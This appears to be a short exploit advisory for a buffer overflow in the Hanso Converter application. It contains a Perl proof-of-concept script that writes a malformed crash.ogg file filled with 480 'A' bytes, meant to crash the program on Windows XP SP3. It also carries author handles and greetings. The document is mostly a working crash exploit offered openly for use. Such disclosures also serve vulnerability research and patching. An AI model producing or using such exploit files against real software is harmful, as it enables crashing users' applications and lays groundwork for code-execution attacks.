===================================================
Hanso Converter (.ogg) Buffer Overflow Vulnerability
===================================================
#Title: Hanso Converter (.ogg) Buffer Overflow Vulnerability
#Author    :   anT!-Tr0J4n
#Email      :   D3v-PoinT[at]hotmail[d0t]com & C1EH[at]Hotmail[d0t]com
#Greetz    :   Dev-PoinT.com ~ inj3ct0r.com  ~all DEV-PoinT t34m
#thanks    :   r0073r ; Sid3^effects ; L0rd CrusAd3r ; all Inj3ct0r 31337 Member
#Home     :   www.Dev-PoinT.com  $ http://inj3ct0r.com
#Software :  http://www.hansotools.com/applications/hanso-converter.html
#Tested on:   Windows XP sp3
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 
#!/usr/bin/perl
print "| Author: anT!-Tr0J4n      |\n";
print "| Greetz :http://inj3ct0r.com     |\n";
print "|Home : www.Dev-PoinT.com  |\n";
 
my $junk= "\x41" x 480 ;
open(file,">crash.ogg");
print file $junk ;
close(file);